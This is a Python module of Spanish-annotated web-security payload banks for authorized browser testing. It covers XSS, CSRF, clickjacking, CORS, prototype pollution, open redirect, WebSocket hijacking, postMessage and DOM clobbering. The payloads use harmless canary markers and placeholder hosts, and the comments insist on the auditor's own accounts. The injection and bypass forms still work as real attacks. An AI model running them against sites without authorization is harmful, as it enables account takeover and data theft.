"""Bancos copiables para vulnerabilidades de navegador.

Cada bloque contiene variantes independientes. Se adapta al sink observado y se
ejecuta sobre cuentas, objetos y dominios controlados; no demuestra impacto por sí solo.
"""

PS_XSS = 'https://portswigger.net/web-security/cross-site-scripting/contexts'
PS_DOM = 'https://portswigger.net/web-security/cross-site-scripting/dom-based'
PS_CSRF = 'https://portswigger.net/web-security/csrf/bypassing-token-validation'
PS_SAMESITE = 'https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions'
PS_CLICK = 'https://portswigger.net/web-security/clickjacking'
PS_CORS = 'https://portswigger.net/web-security/cors'
PS_CORS_HEADERS = 'https://portswigger.net/web-security/cors/access-control-allow-origin'
PS_PP = 'https://portswigger.net/web-security/prototype-pollution/client-side'
PS_PP_APIS = 'https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis'
PS_REDIRECT = 'https://portswigger.net/web-security/dom-based/open-redirection'
PS_WS = 'https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking'
PS_WS_GENERAL = 'https://portswigger.net/web-security/websockets'
PS_MESSAGE = 'https://portswigger.net/web-security/dom-based/controlling-the-web-message-source'
PS_CLOBBER = 'https://portswigger.net/web-security/dom-based/dom-clobbering'
PS_CLOBBER_RESEARCH = 'https://portswigger.net/research/dom-clobbering-strikes-back'
PS_CLOBBER_SW = 'https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering'
PATT_REDIRECT = 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md'


BANCOS = {
    'xss': [
        ('basicos', 'HTML entre etiquetas', 'html',
         r'''<img src=x onerror="document.documentElement.dataset.xss='xss-123'">
<svg onload="document.documentElement.dataset.xss='xss-123'"></svg>
<script>document.documentElement.dataset.xss='xss-123'</script>''',
         'Probar una alternativa cada vez si el valor llega a HTML sin escape. El script inline puede ser bloqueado por CSP y no se ejecuta al insertarlo con innerHTML.', PS_XSS),
        ('contextos', 'Atributos HTML según delimitador', 'html',
         r'''" autofocus onfocus="document.documentElement.dataset.xss='xss-123'" x="
' autofocus onfocus="document.documentElement.dataset.xss='xss-123'" x='
x onpointerenter=document.documentElement.dataset.xss=123 x''',
         'Primera línea: comillas dobles; segunda: simples; tercera: atributo sin comillas e interacción del puntero. Inspeccionar el DOM resultante.', PS_XSS),
        ('contextos', 'JavaScript existente', 'js',
         r"""';document.documentElement.dataset.xss='xss-123';//
";document.documentElement.dataset.xss='xss-123';//
${document.documentElement.dataset.xss='xss-123'}
</script><img src=x onerror="document.documentElement.dataset.xss='xss-123'">""",
         'La primera variante requiere cadena entre comillas simples y debe comenzar con apóstrofo; la segunda exige comillas dobles, la tercera backticks y la cuarta un elemento script parseado como HTML.', PS_XSS),
        ('contextos', 'URL de enlace', 'text',
         r'''javascript:document.documentElement.dataset.xss='xss-123'
javascript:void(document.documentElement.dataset.xss='xss-123')''',
         'Ambas variantes requieren un enlace href que permita javascript: y un clic real. CSP y navegador pueden impedirlo.', PS_XSS),
        ('contextos', 'Fuentes DOM query y hash', 'text',
         r'''https://{ORIGEN}/page?q=%3Cimg%20src%3Dx%20onerror%3D%22document.documentElement.dataset.xss%3D123%22%3E
https://{ORIGEN}/page#%3Cimg%20src%3Dx%20onerror%3D%22document.documentElement.dataset.xss%3D123%22%3E
https://{ORIGEN}/page?q=%3Cscript%3Edocument.documentElement.dataset.xss%3D123%3C%2Fscript%3E''',
         'Query y hash son fuentes distintas y pueden requerir decodificación. La tercera línea solo corresponde a document.write; innerHTML no ejecuta script insertado así. Confirmar fuente→sink.', PS_DOM),
        ('avanzados', 'RCDATA y cierre de elemento', 'html',
         r'''</textarea><img src=x onerror="document.documentElement.dataset.xss='xss-123'">
</title><img src=x onerror="document.documentElement.dataset.xss='xss-123'">
</script><img src=x onerror="document.documentElement.dataset.xss='xss-123'">''',
         'Usar únicamente si el valor se inserta dentro del elemento correspondiente. La prueba depende del parser HTML antes de cualquier evaluación JavaScript.', PS_XSS),
        ('avanzados', 'Escape incompleto y entidad en handler', 'text',
         r'''\';document.documentElement.dataset.xss='xss-123';//
&apos;;document.documentElement.dataset.xss='xss-123';//
" accesskey="x" onclick="document.documentElement.dataset.xss='xss-123'" x="''',
         'Primera línea: servidor escapa comilla pero no backslash; segunda: JS dentro de atributo HTML que decodifica entidad; tercera: input oculto o link/meta y combinación accesskey del navegador.', PS_XSS),
    ],
    'csrf': [
        ('basicos', 'Formularios cruzados reversibles', 'html',
         r'''<form action="https://{ORIGEN}/api/profile" method="POST"><input name="displayName" value="csrf-123"><button>Enviar prueba</button></form>
<form action="https://{ORIGEN}/api/profile" method="POST" enctype="multipart/form-data"><input name="displayName" value="csrf-123"><button>Enviar multipart</button></form>
<form action="https://{ORIGEN}/api/profile/set-name" method="GET"><input name="value" value="csrf-123"><button>Probar GET</button></form>''',
         'Ejecutar una alternativa cada vez sobre la cuenta propia y restaurar el estado. Verificar cookie enviada, acción efectiva y token exigido.', PS_CSRF),
        ('contextos', 'Token ausente, vacío o de otra sesión', 'http',
         r'''POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_A}
Content-Type: application/x-www-form-urlencoded

displayName=csrf-123

POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_A}
Content-Type: application/x-www-form-urlencoded

csrf=&displayName=csrf-123

POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_B}
Content-Type: application/x-www-form-urlencoded

csrf={TOKEN_DE_A}&displayName=csrf-123''',
         'Son tres requests independientes para Repeater. Comparar con token válido; usar solo sesiones A/B propias. La aceptación debe producir un cambio real.', PS_CSRF),
        ('contextos', 'SameSite Lax y método alternativo', 'html',
         r'''<a href="https://{ORIGEN}/api/profile/set-name?value=csrf-123">Navegación GET superior</a>
<form action="https://{ORIGEN}/api/profile" method="GET"><input name="_method" value="POST"><input name="displayName" value="csrf-123"><button>Probar override</button></form>''',
         'La cookie Lax puede viajar en navegación superior GET. _method solo sirve si el framework lo procesa y no se exige token.', PS_SAMESITE),
        ('avanzados', 'SameSite Strict y gadget del sitio', 'html',
         r'''<a href="https://{ORIGEN}/redirect?next=%2Fapi%2Fprofile%2Fset-name%3Fvalue%3Dcsrf-123">Gadget de redirección cliente</a>
<a href="https://{SUBDOMINIO_CONTROLADO}.{ORIGEN}/prueba-csrf">Página hermana controlada</a>''',
         'Primera variante requiere redirección por JavaScript del sitio, no 30x HTTP; segunda exige subdominio autorizado y controlado. Registrar Origin y cookies reales.', PS_SAMESITE),
        ('avanzados', 'Referer omitido', 'html',
         r'''<meta name="referrer" content="no-referrer"><form action="https://{ORIGEN}/api/profile" method="POST"><input name="displayName" value="csrf-123"><button>Sin Referer</button></form>
<a rel="noreferrer" href="https://{ORIGEN}/api/profile/set-name?value=csrf-123">GET sin Referer</a>''',
         'La defensa debe depender de Referer y omitir la validación cuando falta. En POST el navegador aún puede enviar Origin; comprobar cambio propio.', 'https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses'),
        ('avanzados', 'Double submit sin firma', 'http',
         r'''POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_A}; csrf=csrf-123
Content-Type: application/x-www-form-urlencoded

csrf=csrf-123&displayName=csrf-123

POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_A}; csrf=csrf-123
Content-Type: application/x-www-form-urlencoded

csrf=incorrecto&displayName=csrf-123''',
         'Requests independientes; comparar aceptación y rechazo. El bypass entre orígenes exige demostrar que se puede fijar la cookie CSRF, no solo editarla en Repeater.', PS_CSRF),
    ],
    'clickjacking': [
        ('basicos', 'Comprobar framing de páginas sensibles', 'html',
         r'''<iframe src="https://{ORIGEN}/account/settings" width="1000" height="700"></iframe>
<iframe src="https://{ORIGEN}/account/consent" width="1000" height="700"></iframe>''',
         'Elegir la ruta real con una acción reversible. Que la página cargue en iframe es una precondición; confirmar también que se puede accionar.', PS_CLICK),
        ('contextos', 'Superposición y clic único', 'html',
         r'''<button style="position:absolute;left:{X}px;top:{Y}px">Ver prueba</button><iframe style="position:absolute;left:0;top:0;width:1000px;height:700px;opacity:.05;z-index:2" src="https://{ORIGEN}/account/settings"></iframe>
<button style="position:absolute;left:{X}px;top:{Y}px">Continuar</button><iframe style="position:absolute;left:0;top:0;width:1000px;height:700px;opacity:.2;z-index:2" src="https://{ORIGEN}/account/consent"></iframe>''',
         'Son variantes alternativas. Medir coordenadas y viewport en cuenta propia; algunos navegadores limitan frames casi transparentes.', PS_CLICK),
        ('contextos', 'Formulario prellenado y dos pasos', 'html',
         r'''<iframe src="https://{ORIGEN}/account/settings?displayName=canary-123" width="1000" height="700"></iframe>
<button style="position:absolute;left:{X1}px;top:{Y1}px">Paso 1</button><button style="position:absolute;left:{X2}px;top:{Y2}px">Paso 2</button><iframe style="position:absolute;left:0;top:0;opacity:.05;z-index:2;width:1000px;height:700px" src="https://{ORIGEN}/account/settings"></iframe>''',
         'La primera exige que el GET rellene un campo; la segunda requiere dos acciones medidas por separado. Restaurar cambios de la cuenta de prueba.', PS_CLICK),
        ('avanzados', 'Frame buster y sandbox', 'html',
         r'''<iframe src="https://{ORIGEN}/account/settings" sandbox="allow-forms" width="1000" height="700"></iframe>
<iframe src="https://{ORIGEN}/account/settings" sandbox="allow-scripts" width="1000" height="700"></iframe>''',
         'La primera permite formularios pero no scripts; la segunda, scripts pero no formularios. Ninguna elude frame-ancestors o X-Frame-Options válidos.', PS_CLICK),
        ('avanzados', 'Política efectiva en la respuesta', 'bash',
         r"""curl -si "https://{ORIGEN}/account/settings" | rg -i 'content-security-policy|x-frame-options'
curl -si "https://{ORIGEN}/account/consent" | rg -i 'content-security-policy|x-frame-options'""",
         'Comparar la ruta exacta y el navegador. Un header ausente, o un onload de iframe, no basta para demostrar la acción.', PS_CLICK),
    ],
    'cors': [
        ('basicos', 'Origen arbitrario y null', 'bash',
         r"""curl -si -H 'Origin: https://{HOST_CONTROLADO_A}' 'https://{ORIGEN}/api/me'
curl -si -H 'Origin: https://{HOST_CONTROLADO_B}' 'https://{ORIGEN}/api/me'
curl -si -H 'Origin: null' 'https://{ORIGEN}/api/me'""",
         'Comparar ACAO y ACAC entre orígenes. Una cabecera permisiva todavía exige lectura en navegador con sesión propia.', PS_CORS),
        ('contextos', 'Comparación textual del dominio', 'bash',
         r"""curl -si -H 'Origin: https://{HOST_PERMITIDO}.{HOST_CONTROLADO}' 'https://{ORIGEN}/api/me'
curl -si -H 'Origin: https://{PREFIJO_CONTROLADO}{HOST_PERMITIDO}' 'https://{ORIGEN}/api/me'
curl -si -H 'Origin: http://{SUBDOMINIO_PERMITIDO}.{ORIGEN}' 'https://{ORIGEN}/api/me'""",
         'Los dos primeros hosts deben pertenecer al auditor; el tercero requiere control de un subdominio HTTP autorizado. Confirmar coincidencia ACAO exacta.', PS_CORS),
        ('contextos', 'Lectura con credenciales', 'js',
         r'''fetch('https://{ORIGEN}/api/me',{credentials:'include'}).then(r=>r.text()).then(t=>console.log(t.length)).catch(console.error)
fetch('https://{ORIGEN}/api/me',{credentials:'include'}).then(r=>console.log(r.headers.get('X-Own-Marker'))).catch(console.error)''',
         'Ejecutar desde origen controlado. La primera mide longitud de dato propio; la segunda requiere Access-Control-Expose-Headers y header canary. Revisar SameSite.', PS_CORS_HEADERS),
        ('avanzados', 'Origen opaco desde sandbox', 'html',
         r'''<script>addEventListener('message',e=>console.log(e.origin,e.data))</script>
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://{ORIGEN}/api/me',{credentials:'include'}).then(r=>r.text()).then(x=>parent.postMessage(x.length,'*'))</script>"></iframe>
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://{ORIGEN}/api/public',{credentials:'omit'}).then(r=>r.text()).then(x=>parent.postMessage(x.length,'*'))</script>"></iframe>''',
         'Los dos iframes emiten Origin: null y el padre registra solo longitudes. Ejecutar un iframe por vez; el primero depende de cookies, el segundo prueba datos públicos.', PS_CORS),
        ('avanzados', 'Preflight y caché por Origin', 'bash',
         r"""curl -si -X OPTIONS -H 'Origin: https://{HOST_CONTROLADO}' -H 'Access-Control-Request-Method: GET' -H 'Access-Control-Request-Headers: X-Prueba' 'https://{ORIGEN}/api/me'
curl -si -H 'Origin: https://{HOST_CONTROLADO_A}' 'https://{ORIGEN}/api/public?cb=123'
curl -si -H 'Origin: https://{HOST_CONTROLADO_B}' 'https://{ORIGEN}/api/public?cb=123'""",
         'Inspeccionar ACAO/ACAC/ACAH y Vary: Origin. Un preflight permisivo o ausencia de Vary no prueba fuga sin respuesta legible o caché compartida.', PS_CORS_HEADERS),
        ('avanzados', 'Intranet pública sin cookie', 'js',
         r'''fetch('https://{INTRANET_PROPIA}/api/public',{credentials:'omit'}).then(r=>r.text()).then(t=>console.log(t.length)).catch(console.error)
fetch('https://{INTRANET_PROPIA}/api/status',{credentials:'omit'}).then(r=>console.log(r.status)).catch(console.error)''',
         'Solo con intranet propia o autorizada. El navegador del entorno debe poder llegar al host; TLS y Private Network Access pueden bloquear la prueba.', PS_CORS),
    ],
    'prototype-pollution': [
        ('basicos', 'Fuentes de URL', 'text',
         r'''https://{ORIGEN}/?__proto__[marcaPrueba]=pp-123
https://{ORIGEN}/?__proto__.marcaPrueba=pp-123
https://{ORIGEN}/#__proto__[marcaPrueba]=pp-123''',
         'Probar cada parser por separado. En DevTools verificar Object.prototype.marcaPrueba; el eco de la URL no demuestra contaminación.', PS_PP),
        ('contextos', 'JSON y constructor.prototype', 'json',
         r'''{"__proto__":{"marcaPrueba":"pp-123"}}
{"constructor":{"prototype":{"marcaPrueba":"pp-123"}}}
{"options":{"__proto__":{"marcaPrueba":"pp-123"}}}''',
         'Cada línea es un documento JSON independiente. Requiere un merge profundo inseguro; JSON.parse solo no contamina prototipos.', PS_PP),
        ('contextos', 'Forma URL encoded y mensaje', 'text',
         r'''__proto__%5BmarcaPrueba%5D=pp-123
constructor%5Bprototype%5D%5BmarcaPrueba%5D=pp-123
{"__proto__":{"marcaPrueba":"pp-123"}}''',
         'Las dos primeras líneas requieren parser de formulario con anidación; la tercera es event.data JSON si el receptor hace merge. Confirmar origen y herencia.', PS_PP),
        ('avanzados', 'Gadgets de API de navegador', 'text',
         r'''https://{ORIGEN}/?__proto__[headers][X-Prueba]=pp-123
https://{ORIGEN}/?__proto__[value]=pp-123''',
         'Primera: fetch con options sin headers propios. Segunda: Object.defineProperty con descriptor sin value. Confirmar el gadget y sink observados.', PS_PP_APIS),
        ('avanzados', 'Rastreo y control local', 'js',
         r'''Object.prototype.marcaPrueba
({}).marcaPrueba
Object.defineProperty(Object.prototype,'marcaPrueba',{configurable:true,get(){console.trace('marcaPrueba');return 'pp-123'}})''',
         'Las dos primeras expresiones solo leen. Ejecutar la tercera en DevTools de la cuenta propia y recargar para limpiar; una traza de lectura no equivale a sink explotable.', PS_PP),
    ],
    'open-redirect': [
        ('basicos', 'Destinos absolutos y relativos a protocolo', 'text',
         r'''https://{HOST_CONTROLADO}/redir-123
//{HOST_CONTROLADO}/redir-123
https://{ORIGEN}/redirect?next=https%3A%2F%2F{HOST_CONTROLADO}%2Fredir-123''',
         'Las dos primeras líneas son valores para next/url; la tercera es una URL completa. Comprobar Location y destino final, no solo un reflejo.', PATT_REDIRECT),
        ('contextos', 'Allowlist por texto de host', 'text',
         r'''https://{HOST_PERMITIDO}@{HOST_CONTROLADO}/redir-123
https://{HOST_PERMITIDO}.{HOST_CONTROLADO}/redir-123
https://{PREFIJO_CONTROLADO}{HOST_PERMITIDO}/redir-123''',
         'El host efectivo debe pertenecer al auditor. Cada línea prueba userinfo, prefijo o sufijo textual sin frontera DNS.', PATT_REDIRECT),
        ('contextos', 'Parámetros repetidos y doble decode', 'http',
         r'''GET /redirect?next=%2Fcuenta&next=https%3A%2F%2F{HOST_CONTROLADO}%2Fredir-123 HTTP/1.1
Host: {ORIGEN}

GET /redirect?next=https%253A%252F%252F{HOST_CONTROLADO}%252Fredir-123 HTTP/1.1
Host: {ORIGEN}''',
         'Requests independientes. La primera busca desacuerdo entre validador y consumidor; la segunda requiere dos decodificaciones. Confirmar navegación externa.', PATT_REDIRECT),
        ('avanzados', 'Parser de URL y Unicode', 'text',
         r'''/\/{HOST_CONTROLADO}/redir-123
https://{HOST_PERMITIDO}%E3%80%82{HOST_CONTROLADO}/redir-123
https://{ORIGEN}/redirect/https://{HOST_CONTROLADO}/redir-123''',
         'La primera depende del tratamiento de backslash del navegador; la segunda normaliza punto ideográfico; la tercera requiere ruta que captura un destino. Verificar URL final.', PATT_REDIRECT),
        ('avanzados', 'Redirección del DOM', 'text',
         r'''https://{ORIGEN}/redirect#https://{HOST_CONTROLADO}/redir-123
https://{ORIGEN}/page?redirectTo=https%3A%2F%2F{HOST_CONTROLADO}%2Fredir-123
https://{ORIGEN}/page?returnTo=%2F%2F{HOST_CONTROLADO}%2Fredir-123''',
         'Solo sirve si JavaScript lee hash, redirectTo o returnTo y asigna location. Distinguirlo de 30x del servidor y registrar el sink.', PS_REDIRECT),
    ],
    'websocket-hijacking': [
        ('basicos', 'Conexión cruzada de navegador', 'js',
         r'''const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onopen=()=>console.log('abierto');ws.onmessage=e=>console.log('longitud',e.data.length)
const ws2=new WebSocket('wss://{ORIGEN}/chat');ws2.onmessage=e=>console.log('tipo',typeof e.data)''',
         'Ejecutar desde una página controlada. El navegador fija Origin; 101/abierto no prueban datos privados ni cookie enviada.', PS_WS),
        ('contextos', 'Handshake con Origin propio y externo', 'http',
         r'''GET /ws HTTP/1.1
Host: {ORIGEN}
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://{ORIGEN}
Cookie: session={COOKIE_PROPIA}

GET /ws HTTP/1.1
Host: {ORIGEN}
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://{HOST_CONTROLADO}
Cookie: session={COOKIE_PROPIA}''',
         'Requests independientes para Repeater. Un cliente HTTP falsifica Origin; después reproducir en navegador y revisar SameSite/token.', PS_WS),
        ('contextos', 'Dominio hermano y origen opaco', 'html',
         r'''<script>const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onmessage=e=>console.log(e.data.length)</script>
<iframe sandbox="allow-scripts" srcdoc="<script>const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onopen=()=>console.log('abierto')</script>"></iframe>''',
         'La primera línea se aloja en un subdominio propio same-site; la segunda produce Origin: null. Probar una alternativa a la vez y confirmar cookies.', PS_WS),
        ('avanzados', 'Lectura y escritura limitadas', 'js',
         r'''const ws=new WebSocket('wss://{ORIGEN}/ws');ws.onmessage=e=>console.log('bytes propios',e.data.length)
const ws2=new WebSocket('wss://{ORIGEN}/ws');ws2.onopen=()=>ws2.send(JSON.stringify({message:'ws-canary-123'}))
const ws3=new WebSocket('wss://{ORIGEN}/ws');ws3.onopen=()=>ws3.send(JSON.stringify({type:'history',objectId:'{ID_PROPIO}'}))''',
         'Adaptar el esquema a mensajes observados; usar solo chat/objeto propio y verificar estado con segunda cuenta controlada. No registrar contenido privado completo.', PS_WS_GENERAL),
        ('avanzados', 'Tramas binarias y token de handshake', 'js',
         r'''const ws=new WebSocket('wss://{ORIGEN}/ws');ws.binaryType='arraybuffer';ws.onmessage=e=>console.log(e.data instanceof ArrayBuffer?e.data.byteLength:e.data.length)
const ws2=new WebSocket('wss://{ORIGEN}/ws?csrf={TOKEN_PROPIO}');ws2.onopen=()=>console.log('token aceptado')''',
         'La primera prueba mide tramas binarias propias. La segunda es control positivo: comparar con token omitido/incorrecto sin exponer tokens de terceros.', PS_WS),
    ],
    'postmessage': [
        ('basicos', 'Mensajes desde iframe propio', 'js',
         r'''destino.contentWindow.postMessage('msg-canary-123','https://{ORIGEN}')
destino.contentWindow.postMessage({type:'probe',value:'msg-canary-123'},'https://{ORIGEN}')
destino.contentWindow.postMessage(JSON.stringify({type:'probe',value:'msg-canary-123'}),'https://{ORIGEN}')''',
         'Requiere una referencia destino al iframe/popup y un handler observado. El envío no prueba que el receptor actúe.', PS_MESSAGE),
        ('contextos', 'Validación defectuosa de event.origin', 'text',
         r'''https://{DOMINIO_PERMITIDO}.{HOST_CONTROLADO}
https://{PREFIJO_CONTROLADO}{DOMINIO_PERMITIDO}
https://{SUBDOMINIO_PERMITIDO}.{HOST_CONTROLADO}''',
         'Son orígenes de páginas propias para validar startsWith, endsWith o contains/indexOf. El host debe ser controlado y la acción del receptor demostrada.', PS_MESSAGE),
        ('contextos', 'Datos hacia sinks distintos', 'js',
         r'''destino.contentWindow.postMessage('<img src=x onerror="document.documentElement.dataset.msg=123">','https://{ORIGEN}')
destino.contentWindow.postMessage("document.documentElement.dataset.msg='msg-canary-123'",'https://{ORIGEN}')
destino.contentWindow.postMessage(JSON.stringify({type:'render',html:'<img src=x onerror="document.documentElement.dataset.msg=123">'}),'https://{ORIGEN}')''',
         'Líneas para innerHTML, eval y JSON.parse→HTML respectivamente. Adaptar tipo/campo al código receptor; CSP y validación de Origin pueden impedirlo.', PS_MESSAGE),
        ('avanzados', 'Origin null desde sandbox', 'html',
         r'''<iframe src="https://{ORIGEN}/widget"></iframe><iframe sandbox="allow-scripts" srcdoc="<script>parent.frames[0].postMessage('msg-canary-123','https://{ORIGEN}')</script>"></iframe>
<iframe src="https://{ORIGEN}/widget"></iframe><iframe sandbox="allow-scripts" srcdoc="<script>parent.frames[0].postMessage({type:'probe',value:'msg-canary-123'},'https://{ORIGEN}')</script>"></iframe>''',
         'Alternativas separadas; cargar primero el receptor. event.origin será null para el emisor sandbox, pero solo hay fallo si el handler lo acepta y actúa.', PS_MESSAGE),
        ('avanzados', 'Emisor wildcard y ventana source', 'js',
         r'''addEventListener('message',e=>console.log(e.origin,e.source===window.opener,JSON.stringify(e.data).length))
const w=window.open('https://{ORIGEN}/widget');setTimeout(()=>w.postMessage({type:'probe',value:'msg-canary-123'},'https://{ORIGEN}'),1000)''',
         'La primera línea registra metadatos de mensajes entrantes de un flujo propio; la segunda prueba popup como source. Esperar carga real y no imprimir secretos.', PS_MESSAGE),
    ],
    'dom-clobbering': [
        ('basicos', 'Globales por id y name', 'html',
         r'''<a id="configPrueba" href="#clobber-123">marca</a>
<form name="configPrueba"><input value="clobber-123"></form>
<iframe name="marcoPrueba" srcdoc="<p>clobber-123</p>"></iframe>''',
         'Probar cada elemento por separado e inspeccionar window.configPrueba o window.marcoPrueba. La exposición de un global no basta sin gadget.', PS_CLOBBER),
        ('contextos', 'Colección de anchors y propiedad', 'html',
         r'''<a id="someObject"></a><a id="someObject" name="url" href="https://{HOST_CONTROLADO}/inerte.js"></a>
<a id="defaultAvatar"></a><a id="defaultAvatar" name="avatar" href="https://{HOST_CONTROLADO}/imagen-canary.svg"></a>''',
         'La colección DOM puede sombrear someObject.url o defaultAvatar.avatar. Requiere código que use esa propiedad; servir recursos inertes propios.', PS_CLOBBER),
        ('contextos', 'Propiedades de form sombreadas', 'html',
         r'''<form id="formPrueba"><input name="submit" value="clobber-123"></form>
<form id="formPrueba"><input name="action" value="clobber-123"></form>
<form id="formPrueba" onclick="document.documentElement.dataset.clobber=123"><input id="attributes"></form>''',
         'Submit, action y attributes son propiedades diferentes. La tercera exige un sanitizador cliente vulnerable y una interacción de prueba.', PS_CLOBBER),
        ('avanzados', 'Tres niveles y RadioNodeList', 'html',
         r'''<form id="configPrueba" name="ruta"><input id="marcaPrueba" value="clobber-123"></form><form id="configPrueba"></form>
<form id="configPrueba"><input id="ruta" name="marcaPrueba" value="clobber-123"><input id="ruta"></form>''',
         'El primer caso prueba configPrueba.ruta.marcaPrueba; el segundo una colección de controles homónimos. Confirmar en navegador objetivo, especialmente Chrome.', PS_CLOBBER_RESEARCH),
        ('avanzados', 'Iframe como global encadenado', 'html',
         r'''<iframe name="marcoPrueba" srcdoc="<a id='configPrueba' href='https://{HOST_CONTROLADO}/marca'>prueba</a>"></iframe>
<iframe name="marcoPrueba" srcdoc="<form id='configPrueba'><input name='ruta' value='clobber-123'></form>"></iframe>''',
         'Probar cada iframe por separado: srcdoc hereda origen sin sandbox y puede exponer marcoPrueba.configPrueba o su ruta. Requiere un gadget real.', PS_CLOBBER_RESEARCH),
        ('avanzados', 'ID duplicado antes del nodo legítimo', 'html',
         r'''<div id="cdnDomain" style="display:none">clobber-123</div>
<span id="cdnDomain" hidden>clobber-123</span>''',
         'Alternativas independientes: inyectar antes del elemento legítimo si el script usa document.getElementById(...).innerText. Confirmar orden y sink.', PS_CLOBBER_SW),
    ],
}
